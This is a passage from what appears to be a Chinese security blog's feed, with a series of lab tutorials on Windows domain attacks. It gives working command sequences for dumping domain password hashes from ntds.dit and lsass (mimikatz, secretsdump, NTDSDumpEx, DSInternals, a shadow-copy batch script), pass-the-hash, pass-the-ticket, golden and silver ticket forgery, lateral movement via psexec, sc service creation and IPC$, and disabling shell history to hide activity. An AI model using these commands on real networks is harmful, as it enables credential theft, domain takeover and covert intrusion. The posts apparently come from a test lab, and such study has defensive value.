ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p>或者直接使用 python 执行 <a href="http://secretsdump.py">secretsdump.py</a> 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ./build/scripts-3.9</span><br><span class="line">python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114063245079.png" alt="image-20221114063245079" style="zoom:50%;"><h4 id="NTDSDump-exe">NTDSDump.exe</h4><p>NTDSDumpEx.exe 可以进行导出哈希值的操作，下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p><p>获取key：reg save HKLM\SYSTEM c:\Sys.hiv</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx.exe -d ntds.dit -s Sys.hiv -o hash.txt</span><br></pre></td></tr></table></figure><blockquote><p>JetAttachDatabase() failed<br>原因：数据库需要修复，执行esentutl /p /o ntds.dit进行修复</p></blockquote><img src="/2022/11/14/dcsecurity/image-20221114032522919.png" alt="image-20221114032522919" style="zoom:50%;"><h4 id="mimikatz">mimikatz</h4><p>mimikatz 有个 dcsync 的功能，可以利用卷影拷贝服务直接读取 ntds.dit 文件并检索域散列值，不过需要管理员权限。</p><p>导出域内所有用户的用户名和哈希值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.god /all /csv</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114034116357.png" alt="image-20221114034116357" style="zoom:50%;"><p>导出域内指定用户的用户名和哈希值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.god /user:administrator</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114034240897.png" alt="image-20221114034240897" style="zoom:50%;"><p>也可以通过转储 lsass.exe 进行 dump 操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /inject</span><br></pre></td></tr></table></figure><blockquote><p>如果输出内容太多，可以使用 log 命令，这样操作就都会被记录到文本里了</p></blockquote><img src="/2022/11/14/dcsecurity/image-20221114034700963.png" alt="image-20221114034700963" style="zoom:50%;"><h4 id="Invoke-DCSync-ps1">Invoke-DCSync.ps1</h4><p>该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 dcsync 功能，并利用 dcsync 直接读取 ntds.dit 得到域用户密码散列值</p><p>Invoke-DCSync.ps1 下载地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ./Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114035210468.png" alt="image-20221114035210468" style="zoom:50%;"><h4 id="MSF">MSF</h4><p>msf 里的 psexec_ntdsgrab 可以获取目标的 ntds.dit 和 SYSTEM 并将其保存到 /root/.msf4/loot/ 目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/psexec_ntdsgrab</span><br><span class="line">set rhosts 192.168.7.7</span><br><span class="line">set smbdomain teamssix.com</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass 1qaz@WSX</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221114070304878.png" alt="image-20221114070304878" style="zoom:50%;"><p>然后，接下来就可以使用impacket工具包等解析ntds.dit，导出域账户和域散列值</p><p>除此之外，在获取到会话后，也可以直接用 MSF 提供的模块获取 ntds.dit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use windows/gather/credentials/domain_hashdump</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><blockquote><p>注意生成的 payload 需要和目标系统位数一致，不然会报错</p></blockquote><img src="/2022/11/14/dcsecurity/image-20221114071511261.png" alt="image-20221114071511261" style="zoom:50%;"><img src="/2022/11/14/dcsecurity/image-20221114072129688.png" alt="image-20221114072129688" style="zoom:50%;"><p>攻击windows server2012 r2 失败。</p><h4 id="DSInternals">DSInternals</h4><p>DSInternals 主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p><p>DSInternals 下载地址：<a href="https://github.com/MichaelGrafnetter/DSInternals/releases">https://github.com/MichaelGrafnetter/DSInternals/releases</a></p><p>安装 DSInternals</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Module DSInternals -Force</span><br></pre></td></tr></table></figure><p>直接导出 hash，并保存在 output_hash.txt 文件里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key = Get-Bootkey -SystemHivePath &#x27;C:\system&#x27;</span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\ntds.dit&#x27; -Bootkey $key | Out-File output_hash.txt</span><br></pre></td></tr></table></figure><p>或者导出 hashcat 支持的 hash，并保存在output_hashcat.txt 文件里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key = Get-Bootkey -SystemHivePath &#x27;C:\system.hive&#x27;</span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\ntds.dit&#x27; -BootKey $key | Format-Custom -View HashcatNT | Out-File output_hashcat.txt</span><br></pre></td></tr></table></figure><h4 id="vshaow-和-QuarksPwDump">vshaow 和 QuarksPwDump</h4><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p><p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p><p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p><p>QuarksPwDump 下载地址：<a href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p><p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">setlocal</span><br><span class="line">if NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACK</span><br><span class="line">set SOURCE_DRIVE_LETTER=%SystemDrive%</span><br><span class="line">set SOURCE_RELATIVE_PATH=windows\ntds\ntds.dit</span><br><span class="line">set DESTINATION_PATH=%~dp0</span><br><span class="line">@echo ...Determine the scripts to be executed/generated...</span><br><span class="line">set CALLBACK_SCRIPT=%~dpnx0</span><br><span class="line">set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd</span><br><span class="line">@echo ...Creating the shadow copy...</span><br><span class="line">&quot;%~dp0vshadow.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%</span><br><span class="line">del /f %TEMP_GENERATED_SCRIPT%</span><br><span class="line">@goto :EOF</span><br><span class="line">:IS_CALLBACK</span><br><span class="line">setlocal</span><br><span class="line">@echo ...Obtaining the shadow copy device name...</span><br><span class="line">call %TEMP_GENERATED_SCRIPT%</span><br><span class="line">@echo ...Copying from the shadow copy to the destination path...</span><br><span class="line">copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure><p>vshadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p><p>Windows SDK 下载安装完后，找到 vshadow.exe ，我这里的路径是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\x64\vsstools\vshadow.exe</span><br></pre></td></tr></table></figure><p>将这三个文件放到同一个文件夹里后，运行 ShadowCopy.bat 文件，之后可以看到导出了 ntds.dit 和 system.hive 文件</p><img src="/2022/11/14/dcsecurity/image-20221115025824220.png" alt="image-20221115025824220" style="zoom:50%;"><p>使用 esentutl 修复导出的 ntds.dit 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure><p>最后通过 QuarksPwDump.exe 导出域账号和散列值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt</span><br></pre></td></tr></table></figure><img src="/2022/11/14/dcsecurity/image-20221115030216674.png" alt="image-20221115030216674" style="zoom:50%;"><p>在 log 里就能看到导出的密码哈希了</p><img src="/2022/11/14/dcsecurity/image-20221115030235983.png" alt="image-20221115030235983" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域控制器安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透中的一些技巧</title>
      <link href="/2022/11/11/intips/"/>
      <url>/2022/11/11/intips/</url>
      
        <content type="html"><![CDATA[<h3 id="后台执行不记录">后台执行不记录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup xxx &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><h3 id="命令历史不记录">命令历史不记录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set +o history</span><br><span class="line">export HISTFILE=/dev/null export HISTSIZE=0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PTH</title>
      <link href="/2022/11/02/pth/"/>
      <url>/2022/11/02/pth/</url>
      
        <content type="html"><![CDATA[<h3 id="前言">前言</h3><p>假设咱们抓出来的域管 NTLM 哈希解不开，这时候可以尝试 PTH 攻击</p><p><code>pass-the-hash</code>在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过<code>LM Hash</code>和<code>NTLM Hash</code>访问远程主机或服务，而不用提供明文密码。</p><p>微软也对<code>pth</code>打过补丁，然而在测试中发现，在打了补丁后，常规的<code>Pass The Hash</code>已经无法成功，唯独默认的<code>Administrator(SID 500)</code>账号例外，利用这个账号仍可以进行<code>Pass The Hash</code>远程ipc连接。</p><h3 id="环境">环境</h3><p>普通域成员机器：10.1.10.7，操作系统win7</p><p>域控：10.1.10.8，操作系统win2008</p><h3 id="条件">条件</h3><p>域内任意一台主机的本地管理员权限和域管理员密码的 NTLM hash 值</p><h3 id="使用mimikatz进行攻击">使用mimikatz进行攻击</h3><p>首先使用<code>mimikatz</code>抓取域管hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log privilege::debug sekurlsa::logonpasswords exit</span><br></pre></td></tr></table></figure><img src="/2022/11/02/pth/image-20221102162947706.png" alt="image-20221102162947706" style="zoom:50%;"><p>win7上线cs，在cs上操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::pth /user:administrator /domain:fzm.cn /ntlm:abce628a814a052c482797c7422e5c99&quot; exit</span><br></pre></td></tr></table></figure><img src="/2022/11/02/pth/image-20221102174511457.png" alt="image-20221102174511457" style="zoom:50%;"><p>win7域成员机器，会自动弹出cmd.exe，是域管权限，执行命令即可。</p><img src="/2022/11/02/pth/image-20221102174206903.png" alt="image-20221102174206903" style="zoom:50%;"><h3 id="利用hash登录rdp远程桌面">利用hash登录rdp远程桌面</h3><p>如果使用hash远程登录RDP，需要开启&quot;Restricted Admin Mode&quot;, 在Windows8.1和Windows Server 2012R2上默认开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug sekurlsa::pth /user:rmuser /domain:his-test.com /ntlm:e8043f3b38a0e3d7921a82291f6bb579 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PTT之kekeo</title>
      <link href="/2022/11/02/kekeoptt/"/>
      <url>/2022/11/02/kekeoptt/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>制作票据进行PTT的时候，需要知道对方的ntlm哈希，才能制作</p><h3 id="0x01-过程">0x01 过程</h3><p>1、生成票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:&quot;fzm\administrator&quot; /domain:fzm.cn /ntlm:abce628a814a052c482797c7422e5c99</span><br></pre></td></tr></table></figure><img src="/2022/11/02/kekeoptt/image-20221102160705674.png" alt="image-20221102160705674" style="zoom:50%;"><p>2、导入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGT_fzm~administrator@FZM.CN_krbtgt~fzm.cn@FZM.CN.kirbi</span><br></pre></td></tr></table></figure><img src="/2022/11/02/kekeoptt/image-20221102161036238.png" alt="image-20221102161036238" style="zoom:50%;"><p>3.查看票据并访问域控</p><img src="/2022/11/02/kekeoptt/image-20221102161249181.png" alt="image-20221102161249181" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>金银票据</title>
      <link href="/2022/11/02/ticket/"/>
      <url>/2022/11/02/ticket/</url>
      
        <content type="html"><![CDATA[<h2 id="黄金票据">黄金票据</h2><h3 id="0x00-前言">0x00 前言</h3><blockquote><p><code>Golden ticket</code>的作用是可以生成任意用户的tgt,那么问题就来了,是什么条件能够让他生成任意用户的tgt呢？还得要看kerberos认证的过程,在windows认证过程中，客户端将自己的信息发送给KDC,然后KDC使用krbtgt用户密码的hash作为密钥进行加密，生成TGT。</p></blockquote><p>那么如果获取到了<code>krbtgt</code>的密码hash值，就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门。</p><h3 id="0x01-条件">0x01 条件</h3><ul><li>krbtgt用户的hash(就意味着你已经有域控制器权限了)</li><li>域名称</li><li>域的SID值</li><li>要伪造的用户名</li></ul><h3 id="0x02-利用">0x02 利用</h3><p>1、先登录域控制器，dump krbtgt用户的hash值,获取域sid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102141758445.png" alt="image-20221102141758445" style="zoom:50%;"><p>这里讲一个小技巧，mimikatz 运行结果不容易复制，可以输出到一个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot; exit &gt;&gt; log.txt</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102142225774.png" alt="image-20221102142225774" style="zoom:50%;"><p>2、登录普通域用户生成TGT凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:fzm.cn /sid:S-1-5-21-804046751-2176370659-833378800 /krbtgt:3e000e366d0b6191732cfa7c8b77511e /ticket:gold.kirbi</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102142634618.png" alt="image-20221102142634618" style="zoom:50%;"><p>3、注入黄金票据并访问域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt gold.kirbi</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102144604997.png" alt="image-20221102144604997" style="zoom:50%;"><img src="/2022/11/02/ticket/image-20221102144534774.png" alt="image-20221102144534774" style="zoom:50%;"><p>4、使用psexec连接域控</p><img src="/2022/11/02/ticket/image-20221102145229217.png" alt="image-20221102145229217" style="zoom:50%;"><p>5、查看票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102144715512.png" alt="image-20221102144715512" style="zoom:50%;"><p>6、清除票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102144830745.png" alt="image-20221102144830745" style="zoom:100%;"><p>7、清除后，无法访问域控</p><img src="/2022/11/02/ticket/image-20221102144902480.png" alt="image-20221102144902480" style="zoom:50%;"><h2 id="白银票据">白银票据</h2><h3 id="0x00-前言-2">0x00 前言</h3><p><code>Sliver ticket</code>和<code>golden ticket</code>不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。</p><p>不像是<code>Golden ticket</code>，是由krgtgt用户的密码hash进行加密，伪造tgt可以获取到所有权限。</p><p>白银票据这里只是对单一的服务进行授权，利用过程和<code>golden ticket</code>差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt。</p><h3 id="0x01-利用">0x01 利用</h3><p>1、登录DC，抓取ntlm hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102151721436.png" alt="image-20221102151721436" style="zoom:50%;"><p>2、在普通域用户中生成票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:fzm.cn /sid:S-1-5-21-804046751-2176370659-833378800 /target:dc2.fzm.cn /service:cifs /rc4:5ae417641cc7e70629f4f148d06deb9a /user:administrator /ptt</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102151642309.png" alt="image-20221102151642309" style="zoom:50%;"><p>3、查看票证访问域控</p><img src="/2022/11/02/ticket/image-20221102151813722.png" alt="image-20221102151813722" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
            <tag> PTT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用psexec进行横向</title>
      <link href="/2022/11/02/psexec/"/>
      <url>/2022/11/02/psexec/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p><code>psexec</code> 是 windows 下非常好的一款远程命令行工具。<code>psexec</code>的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启)。但是，假如目标主机开启了防火墙，<code>psexec</code>也是不能使用的，会提示找不到网络路径。由于<code>psexec</code>是Windows提供的工具，所以杀毒软件将其列在白名单中。</p><h3 id="0x01-psexec原理">0x01 psexec原理</h3><ul><li>通过<code>ipc$</code>连接<code>admin$</code>，释放二进制文件<code>psexecsvc.exe</code>到目标</li><li>通过服务管理<code>SCManager</code>远程创建一个<code>psexec</code>服务，并启动服务</li><li>客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据</li><li>运行结束后删除服务</li></ul><h3 id="0x02-使用前提">0x02 使用前提</h3><ul><li>对方主机开启了 <code>admin$</code>共享，如果关闭了<code>admin$</code>共享，会提示：找不到网络名</li><li>对方未开启防火墙</li><li>如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li><li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户</li></ul><h3 id="0x03-用法">0x03 用法</h3><ul><li>-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框</li><li>-u：用户名</li><li>-p：密码</li><li>-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -accepteula \\10.1.10.8 -u fzm\administrator -p abc12345. -s cmd.exe</span><br></pre></td></tr></table></figure><img src="/2022/11/02/psexec/image-20221102110825596.png" alt="image-20221102110825596" style="zoom:50%;"><p>这里也可以先建立ipc连接后直接调用<code>PsExec64.exe</code>调用cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.10.8\ipc$ abc12345. /user:&quot;fzm\administrator&quot;</span><br><span class="line"></span><br><span class="line">PsExec.exe -accepteula \\10.1.10.8 cmd.exe</span><br></pre></td></tr></table></figure><img src="/2022/11/02/psexec/image-20221102111223015.png" alt="image-20221102111223015" style="zoom:50%;"><img src="/2022/11/02/psexec/image-20221102111336406.png" alt="image-20221102111336406" style="zoom:50%;"><p>也可以直接执行命令(在建立ipc连接的基础上)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\10.1.10.8 ipconfig</span><br></pre></td></tr></table></figure><img src="/2022/11/02/psexec/image-20221102111530400.png" alt="image-20221102111530400" style="zoom:50%;"><h3 id="0x04-系统日志">0x04 系统日志</h3><p>psexec服务将会安装在远程系统中，此时将会生成 Event 7045，7036 这2种事件日志；有可能预生成Event 4624和Event 4652 Windows事件日志，日志会记录下该工具的使用数据。</p><img src="/2022/11/02/psexec/image-20221102112848682.png" alt="image-20221102112848682" style="zoom:50%;"><img src="/2022/11/02/psexec/image-20221102112556421.png" alt="image-20221102112556421" style="zoom:50%;"><img src="/2022/11/02/psexec/image-20221102112709928.png" alt="image-20221102112709928" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用windows服务之SC进行横向</title>
      <link href="/2022/11/02/sc/"/>
      <url>/2022/11/02/sc/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-前言">0x01 前言</h3><blockquote><p>利用windows服务进行横向渗透主要是通过sc命令，但是注意这里跟之前windows远程命令相比多了一个条件，即当前主机需要为administrator权限。</p></blockquote><h3 id="0x02-sc命令">0x02 sc命令</h3><blockquote><p>sc命令是XP系统中功能强大的DOS命令,SC命令能与“服务控制器”和已安装设备进行通讯。SC是用于与服务控制管理器和服务进行通信的命令行程序。</p></blockquote><p>利用sc命令进行横向渗透的大体流程如下：</p><p>1.与靶机建立ipc连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.10.7\ipc$ &quot;1qaz@WSX&quot; /user:fzm\user1</span><br></pre></td></tr></table></figure><img src="/2022/11/02/sc/image-20221102101445322.png" alt="image-20221102101445322" style="zoom:50%;"><p>2.拷贝exe到主机系统上</p><img src="/2022/11/02/sc/image-20221102101459585.png" alt="image-20221102101459585" style="zoom:50%;"><p>3.在靶机上创建一个shell的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\win7 create shell binpath= &quot;c:\abc.exe&quot;</span><br></pre></td></tr></table></figure><img src="/2022/11/02/sc/image-20221102101801488.png" alt="image-20221102101801488" style="zoom:50%;"><p>4.启动shell服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\win7 start shell</span><br></pre></td></tr></table></figure><img src="/2022/11/02/sc/image-20221102102032987.png" alt="image-20221102102032987" style="zoom:50%;"><p>成功上线</p><p><img src="/2022/11/02/sc/image-20221102101922849.png" alt="image-20221102101922849"></p><p>5.删除创建的shell服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\win7 delete shell</span><br></pre></td></tr></table></figure><img src="/2022/11/02/sc/image-20221102102117550.png" alt="image-20221102102117550" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用IPC进行横向</title>
      <link href="/2022/11/01/ipc/"/>
      <url>/2022/11/01/ipc/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><blockquote><p><code>IPC$</code>(Internet Process Connection) 是为了让进程之间通信的一种“管道”，通过提供用户名密码建立了一条安全的、加密的、用于数据交换的通道。当然，还是在同一个时间，还是同样的两个IP，他们之间只能建立一个<code>IPC$</code>连接，脚踏多条船无论什么时候都是不可取的。通过这个连接，可以实现在被连接的目标机器上搞文件上传、下载、命令执行……</p></blockquote><blockquote><p>IPC$默认大概率会禁用空密码的用户进行连接，并且目前的windows系统在安装的时候都会默认禁用<code>Administrator</code>用户，而是创建一个普通用户并把它加到管理组内</p></blockquote><h3 id="0x01-前提条件">0x01 前提条件</h3><ul><li><p>139或445端口开启</p><p>目标机器没有禁用<code>IPC$</code>连接，没有什么防火防盗拦截<code>IPC$</code>，139 445 端口也开了（能走445走445，不能则走139）</p></li></ul><blockquote><p>SMB协议（445端口）：windows文件打印共享服务</p><p>NETBios（139端口）：NetBIOS协议是一种在局域网上的程序可以使用的应用程序编程接口（API）</p></blockquote><ul><li>知道管理员的密码（明文）</li></ul><h3 id="0x02-常用命令">0x02 常用命令</h3><p>建立空连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.10.7\ipc$ &quot;&quot; /user:&quot;&quot;</span><br></pre></td></tr></table></figure><p>建立完整的用户名，密码连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.10.7\ipc$ &quot;password&quot; /user:&quot;username&quot;   #工作组内</span><br><span class="line">net use \\10.1.10.7\ipc$ &quot;1qaz@WSX&quot; /user:fzm\user1     #域内</span><br></pre></td></tr></table></figure><p>列出主机的进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 10.1.10.7 /U administrator /P Aa123456</span><br></pre></td></tr></table></figure><p>删除IPC$连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.10.7\ipc$ /del</span><br></pre></td></tr></table></figure><p>映射路径  (将对方的c盘映射为自己的z盘，其他盘类推)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\win7\c$ &quot;1qaz@WSX&quot; /user:fzm\user1</span><br><span class="line">net use z: \\win7\c$        #已经建立连接的情况下</span><br></pre></td></tr></table></figure><img 